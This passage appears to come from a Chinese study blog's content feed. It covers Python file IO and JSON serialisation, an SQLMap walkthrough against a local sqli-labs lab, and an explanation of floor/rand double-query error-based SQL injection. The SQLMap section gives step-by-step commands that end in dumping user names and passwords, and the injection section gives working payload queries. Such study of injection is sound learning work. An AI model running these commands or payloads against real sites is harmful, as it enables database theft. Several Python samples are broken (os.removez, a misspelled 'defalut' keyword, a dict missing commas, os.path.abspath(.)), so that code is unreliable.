<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span>(<span class="params">Animal, RunnableMixIn, CarnivorousMixIn</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p><code>MixIn</code>的目的就是给一个类增加多个功能，这样，在设计类的时候，我们优先考虑通过多重继承来组合多个<code>MixIn</code>的功能，而不是设计多层次的复杂的继承关系。</p>
]]></content>
      <categories>
        <category>编程</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>PythonIO编程</title>
    <url>/Python/code/6.PythonIO%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="PythonIO编程">PythonIO编程</h1>
<p>主要记录Python的<strong>文件读写</strong>、<strong>文件和目录操作</strong>以及<strong>JSON序列化</strong>。</p>
<h2 id="文件读写">文件读写</h2>
<p>所有模式的定义及含义可以参考Python的<a href="https://docs.python.org/3/library/functions.html#open">官方文档</a>。</p>
<h3 id="读文件">读文件</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    f = open(<span class="string">&#x27;/path/to/file&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    print(f.read())</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure>
<p>每次这样过于繁琐，Python引入了<code>with</code>语句自动帮我们调用<code>close()</code>方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;/path/to/file&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(f.read())</span><br></pre></td></tr></table></figure>
<p><code>read()</code>函数会一次性读取文件的全部内容，如果文件太大，Python程序就直接挂掉了，所以可以使用<code>read(size)</code>来指定每次最多读取size字节的内容，或者使用<code>readline()</code>和<code>readlines()</code>。</p>
<p>一般来说，如果文件较小，直接使用<code>read()</code>方法；如果不能确定文件大小，就反复调用<code>read(size)</code>方法；如果是配置文件，调用<code>readlines()</code>最方便：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    print(line.strip()) <span class="comment"># 去掉&#x27;\n&#x27;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>像<code>open()</code>函数返回的这种有个<code>read()</code>方法的对象，在Python中称为file-like-object。除了file外，还可以是内存的字节流，网络流，自定义流。</p>
</blockquote>
<h4 id="二进制文件">二进制文件</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = open(<span class="string">&#x27;/User/xxx/test.jpg&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.read()</span><br><span class="line"><span class="string">b&#x27;\xff\xd8\xff\xe1\x00\x18Exif\x00\x00...&#x27;</span> <span class="comment"># 十六进制表示的字节</span></span><br></pre></td></tr></table></figure>
<h4 id="字符编码">字符编码</h4>
<p>读取非Unicode编码的文件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = open(<span class="string">&#x27;/User/xxx/gbk.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;gbk&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>如果遇到一些编码不规范的文件，<code>open()</code>函数还接收一个<code>error</code>参数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.open(<span class="string">&#x27;\User\xxx\gbk.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;gbk&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="写文件">写文件</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = open(<span class="string">&#x27;/User/xxx/test.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.write(<span class="string">&#x27;Hello, world!&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.close()</span><br></pre></td></tr></table></figure>
<p>只有调用<code>close()</code>方法时，操作系统才保证把没有写入的数据全部写入磁盘。忘记调用<code>close()</code>的后果是数据可能只写了一部分到磁盘，剩下的丢失了。所以，还是用<code>with</code>语句来得保险：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;/User/xxx/test.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&#x27;Hello, world&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>如果我们希望追加到文件末尾怎么办？可以传入<code>'a'</code>以追加（append）模式写入。</p>
<h2 id="StringIO和BytesIO">StringIO和BytesIO</h2>
<h3 id="StringIO">StringIO</h3>
<h4 id="写入">写入</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = StringIO()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f. write(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.write(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.write(<span class="string">&#x27;world!&#x27;</span>)</span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(f.getvalue())</span><br><span class="line">Hello world!</span><br></pre></td></tr></table></figure>
<p><code>getvalue()</code>方法用于获得写入后的str。</p>
<h4 id="读取">读取</h4>
<p>要读取StringIO，可以用一个str初始化StringIO，然后像读取文件一样读取：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = StringIO(<span class="string">&#x27;Hello!\nHi!\nGoogbye!&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="meta">... </span>	s = f.readline()</span><br><span class="line"><span class="meta">... </span>	<span class="keyword">if</span> s == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line"><span class="meta">... </span>		<span class="keyword">break</span></span><br><span class="line"><span class="meta">... </span>	print(s.strip())</span><br><span class="line"><span class="meta">... </span></span><br><span class="line">Hello!</span><br><span class="line">Hi!</span><br><span class="line">Googbye!</span><br></pre></td></tr></table></figure>
<h3 id="BytesIO">BytesIO</h3>
<h4 id="写入-v2">写入</h4>
<p>BytesIO实现了在内存中读写bytes，我们创建一个BytesIO，然后写入一些bytes：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = BytesIO()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.write(<span class="string">&#x27;中文&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(f.getvalue())</span><br><span class="line"><span class="string">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span></span><br></pre></td></tr></table></figure>
<p>请注意，写入的不是str，而是经过UTF-8编码的bytes。</p>
<h4 id="读取-v2">读取</h4>
<p>和StringIO类似，可以用一个bytes初始化BytesIO，然后，像读文件一样读取：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = BytesIO(<span class="string">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.read()</span><br><span class="line"><span class="string">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="操作文件和目录">操作文件和目录</h2>
<h3 id="操作目录">操作目录</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看当前目录的绝对路径</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.abspath(.)</span><br><span class="line"><span class="comment"># 在某个目录下创建一个新目录，首先把新目录的完整路径表示出来</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.join(<span class="string">&#x27;/Users/xxx&#x27;</span>, <span class="string">&#x27;testdir&#x27;</span>)</span><br><span class="line"><span class="comment"># 然后创建一个目录</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.mkdir(<span class="string">&#x27;/Users/xxx/testdir&#x27;</span>)</span><br><span class="line"><span class="comment"># 删掉一个目录</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.rmdir(<span class="string">&#x27;/Users/xxx/testdir&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>把两个路径合成一个时，不要直接拼字符串，而要通过<code>os.path.join()</code>函数，这样可以正确处理不同操作系统的路径分隔符。</p>
<p>同样的道理，要拆分路径时，也不要直接去拆字符串，而要通过<code>os.path.split()</code>函数，这样可以把一个路径拆分为两部分，后一部分总是最后级别的目录或文件名：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.split(<span class="string">&#x27;/Users/xxx/testdir/test.txt&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;/Users/xxx/testdir&#x27;</span>, <span class="string">&#x27;test.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><code>os.path.splitext()</code>可以直接得到文件扩展名：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;os.path.splitext(<span class="string">&#x27;/Users/xxx/testdir/test.txt&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;/Users/xxx/testdir/test&#x27;</span>, <span class="string">&#x27;.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="操作文件">操作文件</h3>
<p>假定当前目录下有一个<code>test.txt</code>文件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 对文件重命名</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.rename(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test.py&#x27;</span>)</span><br><span class="line"><span class="comment"># 删除文件</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.removez(<span class="string">&#x27;test.py&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>Python的os模块没有提供文件的复制操作，但是在shutil模块提供了很多中不同需求的文件复制操作。</p>
<ol>
<li>
<p>shutil.copyfileobj(文件1，文件2)：将文件1的数据覆盖copy给文件2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line">f1 = open(<span class="string">&quot;1.txt&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">f2 = open(<span class="string">&quot;2.txt&quot;</span>,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">shutil.copyfileobj(f1,f2)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>shutil.copy(文件1，文件2)：拷贝文件和权限都进行copy。</p>
</li>
<li>
<p>shutil.move(源文件，指定路径)：递归移动一个文件。</p>
</li>
<li>
<p>shutil.copytree(源目录，目标目录)：可以递归copy多个目录到指定目录。</p>
</li>
</ol>
<h3 id="过滤文件">过滤文件</h3>
<p>列出当前目录下的所有目录：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[x <span class="keyword">for</span> x <span class="keyword">in</span> os.listdir(<span class="string">&#x27;.&#x27;</span>) <span class="keyword">if</span> os.path.isdir(x)]</span><br></pre></td></tr></table></figure>
<p>列出指定后缀名的文件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[x <span class="keyword">for</span> x <span class="keyword">in</span> os.listdir(<span class="string">&#x27;x&#x27;</span>) <span class="keyword">if</span> os.path.isfile(x) <span class="keyword">and</span> os.path.splitext(x)[<span class="number">1</span>] == <span class="string">&#x27;py&#x27;</span>]</span><br></pre></td></tr></table></figure>
<h2 id="序列化">序列化</h2>
<p>Python提供了<code>pickle</code>模块来实现序列化。</p>
<p>首先，把一个对象序列化并写入文件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> pickle</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = dict(name=<span class="string">&#x27;Bob&#x27;</span>, age=<span class="number">20</span>, score=<span class="number">88</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.dumps(d)</span><br><span class="line"><span class="string">b&#x27;\x80\x03&#125;q\x00(X\x03\x00\x00\x00ageq\x01K\x14X\x05\x00\x00\x00scoreq\x02KXX\x04\x00\x00\x00nameq\x03X\x03\x00\x00\x00Bobq\x04u.&#x27;</span></span><br></pre></td></tr></table></figure>
<p><code>pickle.dumps()</code>方法把任意对象序列化成一个bytes，然后，就可以把这个<code>bytes</code>写入文件。还有一个<code>pickle.dump()</code>方法，它直接把对象序列化后写入一个file-like Object：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = open(<span class="string">&#x27;dump.txt&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.dump(d, f)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.close()</span><br></pre></td></tr></table></figure>
<p>当我们要把对象从磁盘读到内存时，可以先把内容读到一个<code>bytes</code>，然后用<code>pickle.loads()</code>方法反序列化出对象，也可以用<code>pickle.load()</code>方法直接从一个file-like Object中直接反序列化出对象。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = open(<span class="string">&#x27;dump.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = pickle.load(f)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.close()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d</span><br><span class="line">&#123;<span class="string">&#x27;age&#x27;</span>: <span class="number">20</span>, <span class="string">&#x27;score&#x27;</span>: <span class="number">88</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Bob&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
<h3 id="JSON">JSON</h3>
<p>JSON和Python内置的数据类型对应如下：</p>
<table>
<thead>
<tr>
<th style="text-align:left">JSON类型</th>
<th style="text-align:left">Python类型</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">{}</td>
<td style="text-align:left">dict</td>
</tr>
<tr>
<td style="text-align:left">[]</td>
<td style="text-align:left">list</td>
</tr>
<tr>
<td style="text-align:left">“string”</td>
<td style="text-align:left">str</td>
</tr>
<tr>
<td style="text-align:left">1234.56</td>
<td style="text-align:left">int或float</td>
</tr>
<tr>
<td style="text-align:left">true/false</td>
<td style="text-align:left">True/False</td>
</tr>
<tr>
<td style="text-align:left">null</td>
<td style="text-align:left">None</td>
</tr>
</tbody>
</table>
<p>Python对象—&gt;JSON对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> json</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = dict(name=<span class="string">&#x27;Bob&#x27;</span>, age=<span class="number">20</span>, score=<span class="number">88</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>json.dumps(d)</span><br><span class="line"><span class="string">&#x27;&#123;&quot;age&quot;: 20, &quot;score&quot;: 88, &quot;name&quot;: &quot;Bob&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p><code>dumps()</code>方法返回一个<code>str</code>，内容就是标准的JSON。类似的，<code>dump()</code>方法可以直接把JSON写入一个file-like Object。</p>
<p>JSON对象—&gt;Python对象</p>
<p>要把JSON反序列化为Python对象，用<code>loads()</code>或者对应的<code>load()</code>方法，前者把JSON的字符串反序列化，后者从<code>file-like Object</code>中读取字符串并反序列化：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>json_str = <span class="string">&#x27;&#123;&quot;age&quot;: 20, &quot;score&quot;: 88, &quot;name&quot;: &quot;Bob&quot;&#125;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>json.loads(json_str)</span><br><span class="line">&#123;<span class="string">&#x27;age&#x27;</span>: <span class="number">20</span>, <span class="string">&#x27;score&#x27;</span>: <span class="number">88</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Bob&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>如果想对一个<code>class</code>对象进行序列化操作，我们应该怎么做呢？</p>
<p><a href="https://docs.python.org/3/library/json.html#json.dumps">https://docs.python.org/3/library/json.html#json.dumps</a></p>
<p>可以看到参数列表中<code>dumps()</code>的参数列表提供一个<code>default</code>选项。</p>
<blockquote>
<p><code>defalut</code>：To use a custom <a href="https://docs.python.org/3/library/json.html#json.JSONEncoder">JSONEncoder</a> subclass (e.g. one that overrides the <code>default()</code> method to serialize additional types), specify it with the <em>cls</em> kwarg; otherwise <a href="https://docs.python.org/3/library/json.html#json.JSONEncoder">JSONEncoder</a> is used.</p>
</blockquote>
<p>也就是说如果要序列化一个class对象，我们必须自己写一个序列化的过程，不然Python是不知道如何对一个class对象进行序列化操作的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, age, score</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">        self.score = score</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">student2dict</span>(<span class="params">std</span>):</span></span><br><span class="line">     <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>: std.name</span><br><span class="line">        <span class="string">&#x27;age&#x27;</span>: std.age</span><br><span class="line">        <span class="string">&#x27;score&#x27;</span>: std.score</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
<p>这样，<code>Student</code>实例首先被<code>student2dict()</code>函数转换成<code>dict</code>，然后再被序列化为JSON：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = Student(<span class="string">&#x27;Bob&#x27;</span>, <span class="number">20</span>, <span class="number">88</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(json.dumps(s, defalut=student2dict))</span><br><span class="line">&#123;<span class="string">&quot;age&quot;</span>: <span class="number">20</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;score&quot;</span>: <span class="number">88</span>&#125;</span><br></pre></td></tr></table></figure>
<p>但是为每一个class写一个类似转化函数未免代码的重复率有点太高。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(json.dumps(s, default=<span class="keyword">lambda</span> obj: obj.__dict__))</span><br></pre></td></tr></table></figure>
<p>通常<code>class</code>的实例都有一个<code>__dict__</code>属性，它就是一个<code>dict</code>，用来存储实例变量，所以我们可以直接使用<code>__dict__</code>属性。</p>
<p>如果我们要把JSON反序列化为一个<code>Student</code>对象实例，<code>loads()</code>方法首先转换出一个<code>dict</code>对象，然后，我们传入的<code>object_hook</code>函数负责把<code>dict</code>转换为<code>Student</code>实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dict2student</span>(<span class="params">d</span>):</span></span><br><span class="line">    <span class="keyword">return</span> Student(d[<span class="string">&#x27;name&#x27;</span>], d[<span class="string">&#x27;age&#x27;</span>], d[<span class="string">&#x27;score&#x27;</span>])</span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>json_str = <span class="string">&#x27;&#123;&quot;age&quot;: 20, &quot;score&quot;: 88, &quot;name&quot;: &quot;Bob&quot;&#125;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(json.loads(json_str, object_hook=dict2student))</span><br><span class="line">&lt;__main__.Student object at <span class="number">0x10cd3c190</span>&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>编程</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>IO编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全学习之SQLMap入门学习</title>
    <url>/Web_security/basic_learning/10.SQLMap%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="Web安全学习之SQLMap入门学习">Web安全学习之SQLMap入门学习</h1>
<p>SQLMap注入神器，先就简单的介绍一下最最最最基础的用法，等图书馆什么时候收录了《SQLMap从入门到精通》这本书，再认真研究这个工具（其实看到这个书名就有点不适）。</p>
<h2 id="使用SQLMap">使用SQLMap</h2>
<blockquote>
<p>使用sqli-labs的数据库和页面作为示例。</p>
</blockquote>
<p>已知存在注入点<code>http://localhost/sqlilabs/Less-1/</code>，使用SQLMap对其提取管理员数据，具体步骤如下：</p>
<h2 id="第一步：判断是否是注入点">第一步：判断是否是注入点</h2>
<p><code>sqlmap.py -u &quot;http://localhost/sqlilabs/Less-1/?id=1&quot;</code></p>
<p>使用<code>-u</code>参数指定URL，如果URL存在注入点，将会显示出Web容器，数据库版本信息，如下所示：</p>
<p><img src="https://i.loli.net/2019/10/11/GiJ2hsToFlA9xQa.png" alt=""></p>
<h2 id="第二步：获取数据库">第二步：获取数据库</h2>
<p><code>sqlmap.py -u &quot;http://localhost/sqlilabs/Less-1/?id=1&quot; --dbs</code></p>
<p>使用<code>--dbs</code>参数读取数据库，如下：</p>
<p><img src="https://i.loli.net/2019/10/11/tAV2TqoLZjhkIW3.png" alt=""></p>
<h2 id="第三步：查看当前应用程序所用数据库">第三步：查看当前应用程序所用数据库</h2>
<p><code>sqlmap.py -u &quot;http://localhost/sqlilabs/Less-1/?id=1&quot; --current-db</code></p>
<p><img src="https://i.loli.net/2019/10/11/YlE2mBPOukSajCN.png" alt=""></p>
<h2 id="第四步：列出指定数据库的所有表">第四步：列出指定数据库的所有表</h2>
<p><code>sqlmap.py -u &quot;http://localhost/sqlilabs/Less-1/?id=1&quot; --tables -D &quot;security&quot;</code></p>
<p>使用<code>--table</code>参数获取数据库表，<code>-D</code>参数指定数据库，如下：</p>
<p><img src="https://i.loli.net/2019/10/11/DHF5eToudC2lvmZ.png" alt=""></p>
<h2 id="第五步：读取指定表中的字段名称">第五步：读取指定表中的字段名称</h2>
<p><code>sqlmap.py -u &quot;http://localhost/sqlilabs/Less-1/?id=1&quot; --columns -T &quot;users&quot; -D &quot;security&quot;</code></p>
<p>使用<code>--columns</code>参数列取字段名，如下：</p>
<p><img src="https://i.loli.net/2019/10/11/e18pfm4uWEaoyMA.png" alt=""></p>
<h2 id="第六步：读取指定字段内容">第六步：读取指定字段内容</h2>
<p><code>sqlmap.py -u &quot;http://localhost/sqlilabs/Less-1/?id=1&quot; --dump -C &quot;username, password&quot; -T &quot;users&quot; -D &quot;security&quot;</code></p>
<p><code>--dump</code>意味转存数据，<code>-C</code>指定字段名称，<code>-T</code>指定表名，<code>-D</code>指定数据库名称。</p>
<p><img src="https://i.loli.net/2019/10/11/H3N52dEqahznpWK.png" alt=""></p>
<p>在读取数据后，SQLMap会把读取的数据转存到<code>SQLMap/output/</code>目录下。</p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>SQLMap</tag>
      </tags>
  </entry>
  <entry>
    <title>web安全学习之SQL注入——双查询报错注入及其原理</title>
    <url>/Web_security/basic_learning/11.SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="web安全学习之SQL注入——双查询报错注入及其原理">web安全学习之SQL注入——双查询报错注入及其原理</h1>
<p>如果是SQL报错注入的话，经常会看到一个报错函数<code>floor</code>，虽然有现成的公式给你套用，但我还是觉得有必要弄清楚里面的原理。</p>
<h2 id="payload形成">payload形成</h2>
<p>双注入payload需要用到四个函数和一个group by语句：</p>
<ol>
<li><code>group by</code>：分组语句；</li>
<li><code>rand()</code>：随机生成函数；</li>
<li><code>floor()</code>：取整函数；</li>
<li><code>concat()</code>：字符串连接函数；</li>
<li><code>count()</code>：统计函数。</li>
</ol>
<p>用sqli-labs中的数据库为示例：</p>
<h3 id="concat函数">concat函数</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT concat(&quot;test：&quot;,(SELECT database()))as a;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/09/17/4KfjIGJWsXSVnAo.png" alt=""></p>
<p>执行查询操作时，子查询先开始，所以<code>SELECT database()</code>先执行，然后查询到当前数据库名称”security“，并将其传给concat函数，concat函数在对字符进行连接，于是显示出图上的结果。</p>
<h3 id="rand函数">rand函数</h3>
<p>rand()函数，其作用是生成一个大于0小于1的随机浮点数，如下：</p>
<p><img src="https://i.loli.net/2019/09/17/SChATiln4O8zgMv.png" alt=""></p>
<h3 id="floor函数">floor函数</h3>
<p>floor()函数的作用是对传入的参数取整，这里将rand()生成的随机数做处理进行取整，由于rand()生成的值取整结果只能为0，所以我们这里做一点处理，使其生成一个大于0小于2的随机值，并对其取整：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT floor(rand()*2);</span><br></pre></td></tr></table></figure>
<p>结果要么为0要么为1：</p>
<p><img src="https://i.loli.net/2019/09/17/OcsVkCoTShBtfLg.png" alt=""></p>
<p>接下来结合子查询，显示出数据库信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT concat((SELECT database()), floor(rand()*2)) from users;</span><br></pre></td></tr></table></figure>
<p>users表有多少条数据就会返回多少条信息：</p>
<p><img src="https://i.loli.net/2019/09/17/7C3miecI6Ot59Xa.png" alt=""></p>
<p>在注入中，我们不知道库名表名，往往借助information_schema这个库进行猜解</p>
<p>其中<code>information_schema.schemata</code>中包含了mysql的所有库名，<code>information_schema.tables</code>中包含了所有的表名，<code>information_schema.columns</code>中包含了所有的列名。</p>
<h3 id="group-by语句">group by语句</h3>
<p>现在加上group by语句对返回的数据进行分组处理：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT concat((SELECT database()), floor(rand()*2))as a from information_schema.schemata group by a;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/09/17/1cdrxsztIjBYZqf.png" alt=""></p>
<h3 id="count函数">count函数</h3>
<p>这里增加一个聚合函数count，构造的语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT count(*),concat((SELECT database()), floor(rand()*2))as a from information_schema.schemata group by a;</span><br></pre></td></tr></table></figure>
<p>当我们加上count(*)函数时，操作过程为：查看虚拟表是否存在该主键值，不存在则插入新记录，存在则count(*)字段直接加1。</p>
<p>这里利用count(*)对前面的返回数据进行统计，由于group by 和随机数的原因，有可能会出现重复的键值，当键值重复时就会触发错误，然后报错，由于子查询在错误发生之前就已经完成，所以子查询的内容会随着报错信息一起显示出来：</p>
<p><img src="https://i.loli.net/2019/09/17/SPWnlZtj3DMfw42.png" alt=""></p>
<h2 id="payload原理">payload原理</h2>
<p>直接把<a href="https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html">这一篇文章</a>搬运过来吧，写得非常好，在此就做个小的总结：</p>
<p>通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是<code>floor(random(0)*2)</code>的不确定性，即可能为0也可能为1,<code>（group by key</code>的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。<code>group by floor(random(0)*2)</code>出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下<code>floor(random(0)*2)</code>可能为0，如果此时临时表只有key为1的行和不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时<code>floor(random(0)*2)</code>结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</p>
<p>结论是：当与临时表里面的值进行比较，如果不同，就插入，但是插入的时候又计算了一次，所以如果插入时计算的值与直接比较的值不一样，则报错</p>
]]></content>
      <categories>
